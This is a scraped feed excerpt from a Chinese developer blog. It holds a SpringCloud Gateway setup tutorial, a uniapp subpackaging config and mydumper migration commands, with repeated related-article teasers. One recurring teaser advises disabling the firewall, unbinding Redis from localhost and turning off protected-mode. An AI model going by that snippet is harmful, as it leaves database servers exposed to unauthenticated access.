请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:05 +0000</pubDate>
    </item>
    <item>
      <title>SpringCloud Gateway保姆级入门教程</title>
      <link>https://www.ppmy.cn/news/1540889.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维SpringCloud Gateway保姆级入门教程news/2025/10/31 23:19:04/什么是微服务网关SpringCloud Gateway是Spring全家桶中一个比较新的项目，Spring社区是这么介绍它的：该项目借助Spring WebFlux的能力，打造了一个API网关。旨在提供一种简单而有效的方法来作为API服务的路由，并为它们提供各种增强功能，例如：安全性，监控和可伸缩性。而在真实的业务领域，我们经常用SpringCloud Gateway来做微服务网关，如果你不理解微服务网关和传统网关的区别，可以阅读此篇文章 Service Mesh和API Gateway关系深度探讨 来了解两者的定位区别。以我粗浅的理解，传统的API网关，往往是独立于各个后端服务，请求先打到独立的网关层，再打到服务集群。而微服务网关，将流量从南北走向改为东西走向（见下图），微服务网关和后端服务是在同一个容器中的，所以也有个别名，叫做Gateway Sidecar。image为啥叫Sidecar，这个词应该怎么理解呢，吃鸡里的三蹦子见过没：image摩托车是你的后端服务，而旁边挂着的额外座椅就是微服务网关，他是依附于后端服务的（一般是指两个进程在同一个容器中），是不是生动形象了一些。由于本人才疏学浅，对于微服务相关概念理解上难免会有偏差。就不在此详细讲述原理性的文字了。本文只探讨SpringCloud Gateway的入门搭建和实战踩坑。如果小伙伴们对原理感兴趣，可以等后续原理分析文章。注：本文网关项目在笔者公司已经上线运行，每天承担百万级别的请求，是经过实战验证的项目。文章目录手把手造一个网关引入pom依赖编写yml文件接口转义问题获取请求体（Request Body）踩坑实战获取客户端真实IP尾缀匹配总结源代码完整项目源代码已经收录到我的Github：https://github.com/qqxx6661/springcloud_gateway_demo手把手造一个网关引入pom依赖我使用了spring-boot 2.2.5.RELEASE作为parent依赖：&lt;parent&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;&lt;version&gt;2.2.5.RELEASE&lt;/version&gt;&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
&lt;/parent&gt;在dependencyManagement中，我们需要指定sringcloud的版本，以便保证我们能够引入我们想要的SpringCloud Gateway版本，所以需要用到dependencyManagement：&lt;dependencyManagement&gt;&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;&lt;version&gt;Hoxton.SR8&lt;/version&gt;&lt;type&gt;pom&lt;/type&gt;&lt;scope&gt;import&lt;/scope&gt;&lt;/dependency&gt;&lt;/dependencies&gt;
&lt;/dependencyManagement&gt;最后，是在dependency中引入spring-cloud-starter-gateway：&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;
&lt;/dependency&gt;如此一来，我们便引入了2.2.5.RELEASE版本的网关：image此外，请检查一下你的依赖中是否含有spring-boot-starter-web，如果有，请干掉它。因为我们的SpringCloud Gateway是一个netty+webflux实现的web服务器，和Springboot Web本身就是冲突的。&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
&lt;/dependency&gt;做到这里，实际上你的项目就已经可以启动了，运行SpringcloudGatewayApplication，得到结果如图：image编写yml文件SpringBoot的核心概念是约定优先于配置，在以前初学Spring时，一直不理解这句话的意思，在使用SpringCloud Gateway时，更加深入的理解了这句话。在默认情况下，你不需要任何的配置，就能够运行起来最基本的网关。针对你之后特定的需求，再去追加配置。而SpringCloud Gateway更强大的一点就是内置了非常多的默认功能实现，你需要的大部分功能，比如在请求中添加一个header，添加一个参数，都只需要在yml中引入相应的内置过滤器即可。可以说，yml是整个SpringCloud Gateway的灵魂。一个网关最基本的功能，就是配置路由，在这方面，SpringCloud Gateway支持非常多方式。比如：通过时间匹配通过 Cookie 匹配通过 Header 属性匹配通过 Host 匹配通过请求方式匹配通过请求路径匹配通过请求参数匹配通过请求 ip 地址进行匹配这些在官网教程中，都有详细的介绍，就算你百度下，也会有很多民间翻译的入门教程，我就不再赘述了，我只用一个请求路径做一个简单的例子。在公司的项目中，由于有新老两套后台服务，我们使用不同的uri路径进行区分。老服务路径为：url/api/xxxxxx，服务端口号为8001新服务路径为：url/api/v2/xxxxx，服务端口号为8002那么可以直接在yml里面配置：logging:level:org.springframework.cloud.gateway: DEBUGreactor.netty.http.client: DEBUGspring:cloud:gateway:default-filters:- AddRequestHeader=gateway-env, springcloud-gatewayroutes:- id: "server_v2"uri: "http://127.0.0.1:8002"predicates:- Path=/api/v2/**- id: "server_v1"uri: "http://127.0.0.1:8001"predicates:- Path=/api/**上面的代码解释如下：logging：由于文章需要，我们打开gateway和netty的Debug模式，可以看清楚请求进来后执行的流程，方便后续说明。default-filters:我们可以方便的使用default-filters，在请求中加入一个自定义的header，我们加入一个KV为gateway-env：springcloud-gateway，来注明我们这个请求经过了此网关。这样做的好处是后续服务端也能够看到。routes：路由是网关的重点，相信读者们看代码也能理解，我配置了两个路由，一个是server_v1的老服务，一个是server_v2的新服务。请注意，一个请求满足多个路由的谓词条件时，请求只会被首个成功匹配的路由转发。由于我们老服务的路由是/xx，所以需要将老服务放在后面，优先匹配词缀/v2的新服务，不满足的再匹配到/xx。来看一下http://localhost:8080/api/xxxxx的结果：image来看一下http://localhost:8080/api/v2/xxxxx的结果：image可以看到两个请求被正确的路由了。由于我们真正并没有开启后端服务，所以最后一句error请忽略。接口转义问题在公司实际的项目中，我在搭建好网关后，遇到了一个接口转义问题，相信很多读者可能也会碰到，所以在这里我们最好是防患于未然，优先处理下。问题是这样的，很多老项目在url上并没有进行转义，导致会出现如下接口请求，http://xxxxxxxxx/api/b3d56a6fa19975ba520189f3f55de7f6/140x140.jpg?t=1"这样请求过来，网关会报错：java.lang.IllegalArgumentException: Invalid character '=' for QUERY_PARAM in "http://pic1.ajkimg.com/display/anjuke/b3d56a6fa19975ba520189f3f55de7f6/140x140.jpg?t=1"在不修改服务代码逻辑的前提下，网关其实已经可以解决这件事情，解决办法就是升级到2.1.1.RELEASE以上的版本。The issue was fixed in version spring-cloud-gateway 2.1.1.RELEASE.所以我们一开始就是用了高版本2.2.5.RELEASE，避免了这个问题，如果小伙伴发现之前使用的版本低于 2.1.1.RELEASE，请升级。获取请求体（Request Body）在网关的使用中，有时候会需要拿到请求body里面的数据，比如验证签名，body可能需要参与签名校验。但是SpringCloud Gateway由于底层采用了webflux，其请求是流式响应的，即 Reactor 编程，要读取 Request Body 中的请求参数就没那么容易了。网上谷歌了很久，很多解决方案要么是彻底过时，要么是版本不兼容，好在最后参考了这篇文章，终于有了思路：https://www.jianshu.com/p/db3b15aec646首先我们需要将body从请求中拿出来，由于是流式处理，Request的Body是只能读取一次的，如果直接通过在Filter中读取，会导致后面的服务无法读取数据。SpringCloud Gateway 内部提供了一个断言工厂类ReadBodyPredicateFactory，这个类实现了读取Request的Body内容并放入缓存，我们可以通过从缓存中获取body内容来实现我们的目的。首先新建一个CustomReadBodyRoutePredicateFactory类，这里只贴出关键代码，完整代码请看可运行的Github仓库：@Component
public class CustomReadBodyRoutePredicateFactory extends AbstractRoutePredicateFactory&lt;CustomReadBodyRoutePredicateFactory.Config&gt; {protected static final Log log = LogFactory.getLog(CustomReadBodyRoutePredicateFactory.class);private List&lt;HttpMessageReader&lt;?&gt;&gt; messageReaders;@Value("${spring.codec.max-in-memory-size}")private DataSize maxInMemory;public CustomReadBodyRoutePredicateFactory() {super(Config.class);this.messageReaders = HandlerStrategies.withDefaults().messageReaders();}public CustomReadBodyRoutePredicateFactory(List&lt;HttpMessageReader&lt;?&gt;&gt; messageReaders) {super(Config.class);this.messageReaders = messageReaders;}@PostConstructprivate void overrideMsgReaders() {this.messageReaders = HandlerStrategies.builder().codecs((c) -&gt; c.defaultCodecs().maxInMemorySize((int) maxInMemory.toBytes())).build().messageReaders();}@Overridepublic AsyncPredicate&lt;ServerWebExchange&gt; applyAsync(Config config) {return new AsyncPredicate&lt;ServerWebExchange&gt;() {@Overridepublic Publisher&lt;Boolean&gt; apply(ServerWebExchange exchange) {Class inClass = config.getInClass();Object cachedBody = exchange.getAttribute("cachedRequestBodyObject");if (cachedBody != null) {try {boolean test = config.predicate.test(cachedBody);exchange.getAttributes().put("read_body_predicate_test_attribute", test);return Mono.just(test);} catch (ClassCastException var6) {if (CustomReadBodyRoutePredicateFactory.log.isDebugEnabled()) {CustomReadBodyRoutePredicateFactory.log.debug("Predicate test failed because class in predicate does not match the cached body object", var6);}return Mono.just(false);}} else {return ServerWebExchangeUtils.cacheRequestBodyAndRequest(exchange, (serverHttpRequest) -&gt; {return ServerRequest.create(exchange.mutate().request(serverHttpRequest).build(), CustomReadBodyRoutePredicateFactory.this.messageReaders).bodyToMono(inClass).doOnNext((objectValue) -&gt; {exchange.getAttributes().put("cachedRequestBodyObject", objectValue);}).map((objectValue) -&gt; {return config.getPredicate().test(objectValue);}).thenReturn(true);});}}@Overridepublic String toString() {return String.format("ReadBody: %s", config.getInClass());}};}@Overridepublic Predicate&lt;ServerWebExchange&gt; apply(Config config) {throw new UnsupportedOperationException("ReadBodyPredicateFactory is only async.");}
}代码主要作用：在有body的请求到来时，将body读取出来放到内存缓存中。若没有body，则不作任何操作。这样我们便可以在拦截器里使用exchange.getAttribute("cachedRequestBodyObject")得到body体。对了，我们还没有演示一个filter是如何写的，在这里就先写一个完整的demofilter。让我们新建类DemoGatewayFilterFactory：@Component
public class DemoGatewayFilterFactory extends AbstractGatewayFilterFactory&lt;DemoGatewayFilterFactory.Config&gt; {private static final String CACHE_REQUEST_BODY_OBJECT_KEY = "cachedRequestBodyObject";public DemoGatewayFilterFactory() {super(Config.class);log.info("Loaded GatewayFilterFactory [DemoFilter]");}@Overridepublic List&lt;String&gt; shortcutFieldOrder() {return Collections.singletonList("enabled");}@Overridepublic GatewayFilter apply(DemoGatewayFilterFactory.Config config) {return (exchange, chain) -&gt; {if (!config.isEnabled()) {return chain.filter(exchange);}log.info("-----DemoGatewayFilterFactory start-----");ServerHttpRequest request = exchange.getRequest();log.info("RemoteAddress: [{}]", request.getRemoteAddress());log.info("Path: [{}]", request.getURI().getPath());log.info("Method: [{}]", request.getMethod());log.info("Body: [{}]", (String) exchange.getAttribute(CACHE_REQUEST_BODY_OBJECT_KEY));log.info("-----DemoGatewayFilterFactory end-----");return chain.filter(exchange);};}public static class Config {private boolean enabled;public Config() {}public boolean isEnabled() {return enabled;}public void setEnabled(boolean enabled) {this.enabled = enabled;}}
}这个filter里，我们拿到了新鲜的请求，并且打印出了他的path，method，body等。我们发送一个post请求，body就写一个“我是body”，运行网关，得到结果：image是不是非常清晰明了！你以为这就结束了吗？这里有两个非常大的坑。1. body为空时处理上面贴出的CustomReadBodyRoutePredicateFactory类其实已经是我修复过的代码，里面有一行.thenReturn(true)是需要加上的。这才能保证当body为空时，不会报出异常。至于为啥一开始写的有问题，显然因为我偷懒了，直接copy网上的代码了，哈哈哈哈哈。2. body大小超过了buffer的最大限制这个情况是在公司项目上线后才发现的，我们的请求里body有时候会比较大，但是网关会有默认大小限制。所以上线后发现了频繁的报错：org.springframework.core.io.buffer.DataBufferLimitException: Exceeded limit on max bytes to buffer : 262144image谷歌后，找到了解决方案，需要在配置中增加了如下配置spring: codec:max-in-memory-size: 5MB把buffer大小改到了5M。你以为这就又双叕结束了，太天真了，你会发现可能没有生效。问题的根源在这里：我们在spring配置了上面的参数，但是我们自定义的拦截器是会初始化ServerRequest，这个DefaultServerRequest中的HttpMessageReader会使用默认的262144所以我们在此处需要从Spring中取出CodecConfigurer， 并将里面的Reader传给serverRequest。详细的debug过程可以看这篇参考文献：http://theclouds.io/tag/spring-gateway/OK，找到问题后，就可以修改我们的代码，在CustomReadBodyRoutePredicateFactory里，增加：@Value("${spring.codec.max-in-memory-size}")
private DataSize maxInMemory;@PostConstruct
private void overrideMsgReaders() {this.messageReaders = HandlerStrategies.builder().codecs((c) -&gt; c.defaultCodecs().maxInMemorySize((int) maxInMemory.toBytes())).build().messageReaders();
}这样每次就会使用我们的5MB来作为最大缓存限制了。依然提醒一下，完整的代码可以请看可运行的Github仓库讲到这里，入门实战就差不多了，你的网关已经可以上线使用了，你要做的就是加上你需要的业务功能，比如日志，延签，统计等。踩坑实战获取客户端真实IP很多时候，我们的后端服务会去通过host拿到用户的真实IP，但是通过外层反向代理nginx的转发，很可能就需要从header里拿X-Forward-XXX类似这样的参数，才能拿到真实IP。在我们加入了微服务网关后，这个复杂的链路中又增加了一环。这不，如果你不做任何设置，由于你的网关和后端服务在同一个容器中，你的后端服务很有可能就会拿到localhost:8080（你的网关端口）这样的IP。这时候，你需要在yml里配置PreserveHostHeader，这是SpringCloud Gateway自带的实现：filters:- PreserveHostHeader # 防止host被修改为localhost字面意思，就是将Host的Header保留起来，透传给后端服务。filter里面的源码贴出来给大家：public GatewayFilter apply(Object config) {return new GatewayFilter() {public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) {exchange.getAttributes().put(ServerWebExchangeUtils.PRESERVE_HOST_HEADER_ATTRIBUTE, true);return chain.filter(exchange);}public String toString() {return GatewayToStringStyler.filterToStringCreator(PreserveHostHeaderGatewayFilterFactory.this).toString();}};
}尾缀匹配公司的项目中，老的后端仓库api都以.json结尾（/api/xxxxxx.json），这就催生了一个需求，当我们对老接口进行了重构后，希望其打到我们的新服务，我们就要将.json这个尾缀切除。可以在filters里设置：filters:- RewritePath=(?&lt;segment&gt;/?.*).json, $\{segment} # 重构接口抹去.json尾缀这样就可以实现打到后端的接口去除了.json后缀。总结本文带领读者一步步完成了一个微服务网关的搭建，并且将许多可能隐藏的坑进行了解决。最后的成品项目在笔者公司已经上线运行，并且增加了签名验证，日志记录等业务，每天承担百万级别的请求，是经过实战验证过的项目。最后再发一次项目源码仓库：https://github.com/qqxx6661/springcloud_gateway_demo感谢大家的支持，如果文章对你起到了一丁点帮助，请点赞转发支持一下！你们的反馈是我持续更新的动力，谢谢~参考https://cloud.tencent.com/developer/article/1449300https://juejin.cn/post/6844903795973947400#heading-3https://segmentfault.com/a/1190000016227780https://cloud.spring.io/spring-cloud-static/Greenwich.SR1/multi/multi__reactor_netty_access_logs.htmlhttps://www.cnblogs.com/savorboard/p/api-gateway.htmlhttps://www.servicemesher.com/blog/service-mesh-and-api-gateway/https://www.cnblogs.com/hyf-huangyongfei/p/12849406.htmlhttps://www.codercto.com/a/52970.htmlhttps://github.com/spring-cloud/spring-cloud-gateway/issues/1658https://blog.csdn.net/zhangzhen02/article/details/109082792关注我个人公众号：后端技术漫谈© 著作权归作者所有,转载或内容合作请联系作者喜欢的朋友记得点赞、收藏、关注哦！！！http://www.ppmy.cn/news/1540889.html相关文章uniapp配置微信小程序分包（分包优化）1.manifest.json中 
源码视图中找到mp-weixin&amp;#xff0c;新增代码"optimization":{"subPackages":true}&amp;#xff0c;如下图所示 "optimization" : {"subPackages" : true
} 
2.pages.json中 
分包内静态文件示例 
"subPackages&amp;…阅读更多...利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:04 +0000</pubDate>
    </item>
    <item>
      <title>uniapp配置微信小程序分包（分包优化）</title>
      <link>https://www.ppmy.cn/news/1540888.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维uniapp配置微信小程序分包（分包优化）news/2025/10/31 23:19:03/1.manifest.json中源码视图中找到mp-weixin，新增代码"optimization":{"subPackages":true}，如下图所示"optimization" : {"subPackages" : true
}2.pages.json中分包内静态文件示例"subPackages": [{"root": "pages/sub","pages": [{"path": "index/index"}]
}]以上面的分包为例，放在每个分包root对应目录下的静态文件会被打包到此分包内。关于分包优化的说明（manifest.json 应用配置 | uni-app官网）在对应平台的配置下添加"optimization":{"subPackages":true}开启分包优化目前只支持mp-weixin、mp-qq、mp-baidu、mp-toutiao、mp-kuaishou的分包优化分包优化具体逻辑：静态文件：分包下支持 static 等静态资源拷贝，即分包目录内放置的静态资源不会被打包到主包中，也不可在主包中使用js文件：当某个 js 仅被一个分包引用时，该 js 会被打包到该分包内，否则仍打到主包（即被主包引用，或被超过 1 个分包引用）自定义组件：若某个自定义组件仅被一个分包引用时，且未放入到分包内，编译时会输出提示信息http://www.ppmy.cn/news/1540888.html相关文章利用mydumper从MySQL迁移数据到OceanBase数据库命令记录一&amp;#xff1a;中转服务器环境准备 
1、下载安装包。 
请根据需要在 下载安装包 中&amp;#xff0c;下载对应的安装包并安装。 
2、在数据库主机上解压缩安装包。 
以 mydumper-0.12.7-2-zstd.el7.x86_64.rpm 为示例。 
rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -di…阅读更多...Redis 一些问题关闭Linux防火墙 
找到redis 配置文件 注释  #bind 127.0.0.1 
修改 protected-mode  yes    改为no 如果报&amp;#xff1a;NOAUTH Authentication required错误就是设置了密码 
auth 你的密码 配置Redis 
spring.redis.host192.168.44.132 
spring.redis.port6379
spring.redis.d…阅读更多...如何从小白成长为大神大学新生编程入门攻略&amp;#xff1a;如何从小白成长为大神 
编程已成为当代大学生的重要技能&amp;#xff0c;但面对众多编程语言和学习资源&amp;#xff0c;新生们常常感到迷茫。以下是大学新生入门编程的最佳路径&amp;#xff0c;助你打下坚实的基础&amp;#xff0c;推动未来职业发展。 
方向一…阅读更多...灵当CRM index.php 任意文件上传漏洞复现0x01 产品描述&amp;#xff1a; 灵当CRM是一款专为中小企业量身定制的智能客户关系管理工具&amp;#xff0c;由上海灵当信息科技有限公司开发和运营。该系统广泛应用于多个行业&amp;#xff0c;包括金融、教育、医疗、IT服务及房地产等领域&amp;#xff0c;旨在满足企业对客户个性化管理的需求&amp;…阅读更多...除GOF23种设计模式之简单工厂模式文章目录 1. 简介2. 代码2.1 抽象类&amp;#xff1a;Course.java2.2 产品A:JavaCourse.java2.3 产品B:PythonCourse.java2.4 工厂:CourseFactory.java2.5 测试&amp;#xff1a;Test.java 3. 心得参考链接&amp;#xff08;无&amp;#xff09; 1. 简介 
简单工厂模式(Simple Factory Patern):又称…阅读更多...青少年编程能力等级测评CPA C++五级试卷（1）青少年编程能力等级测评CPA C五级试卷&amp;#xff08;1&amp;#xff09; 一、单项选择题&amp;#xff08;共15题&amp;#xff0c;每题3分&amp;#xff0c;共45分&amp;#xff09; 
CP5_1_1.下列有关类的重用意义的叙述中&amp;#xff0c;不正确的是&amp;#xff08;  &amp;#xff09;。                 
A&amp;#x…阅读更多...C# 中实现安全集合Concurrent 支持删除指定元素的ConcurrentBag实现了IProducerConsumerCollection接口&amp;#xff0c;该接口主要用于生产者消费者模式下&amp;#xff0c;可见该类基本就是为生产消费者模式定制的。然后还实现了常规的IReadOnlyCollection类&amp;#xff0c;实现了该类就需要实现IEnumerable、IEnumerable、 ICollection类…阅读更多...神经网络反向传播交叉熵 计算损失函数对隐藏层激活值a1的梯度本文是交叉熵损失函数为代表的两层神经网络的反向传播量化求导计算公式中的一个公式&amp;#xff0c;单独拿出来做一下解释说明。 公式 8-16 是反向传播算法中&amp;#xff0c;用于计算损失函数对隐藏层激活值  a 1 a_1 a1​ 的梯度。在反向传播过程中&amp;#xff0c;损失函数对隐藏层激活…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:03 +0000</pubDate>
    </item>
    <item>
      <title>利用mydumper从MySQL迁移数据到OceanBase数据库命令记录</title>
      <link>https://www.ppmy.cn/news/1540887.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维利用mydumper从MySQL迁移数据到OceanBase数据库命令记录news/2025/10/31 23:19:02/一：中转服务器环境准备1、下载安装包。请根据需要在 下载安装包 中，下载对应的安装包并安装。2、在数据库主机上解压缩安装包。以mydumper-0.12.7-2-zstd.el7.x86_64.rpm为示例。rpm2cpio mydumper-0.12.7-2-zstd.el7.x86_64.rpm | cpio -div验证是否正确安装。./usr/bin/mydumper --help在备份目的文件夹中，会生成metadata文件和对应的表结构或表数据文件。二：备份操作备份全库mydumper -h xx.xx.xx.xx -P3306 -u username -p ****** -o /data/backup/mysql/备份指定数据库 testmydumper -h xx.xx.xx.xx -P3306 -u username -p ******  -B test -o /data/backup/mysql/备份指定数据库指定表(t1,t2)mydumper -h xx.xx.xx.xx -P3306 -u username -p ****** -B test -T t1,t2 -o /data/backup/mysql/仅备份表数据mydumper -h xx.xx.xx.xx -P3306 -u username -p ****** -B test -T t1 -m -o /data/backup/mysql/备份 t1 表的数据，开并行和数据压缩mydumper -h xx.xx.xx.xx -P3306 -u username -p ****** -B test -T t1 -t 6 -c -o /data/backup/mysql/三：恢复操作禁用外键检查约束在备份的表结构语句里，可能包含外键。在导入 OceanBase MySQL 里时，如果外键依赖的表没有创建，导入脚本会报错，因此在导入之前需要禁用外键检查约束。MySQL [oceanbase]&gt; SET GLOBAL foreign_key_checks=off;
Query OK, 0 rows affectedMySQL [oceanbase]&gt; SHOW GLOBAL VARIABLES LIKE '%foreign%';
+--------------------+-------+
| Variable_name      | Value |
+--------------------+-------+
| foreign_key_checks | OFF   |
+--------------------+-------+
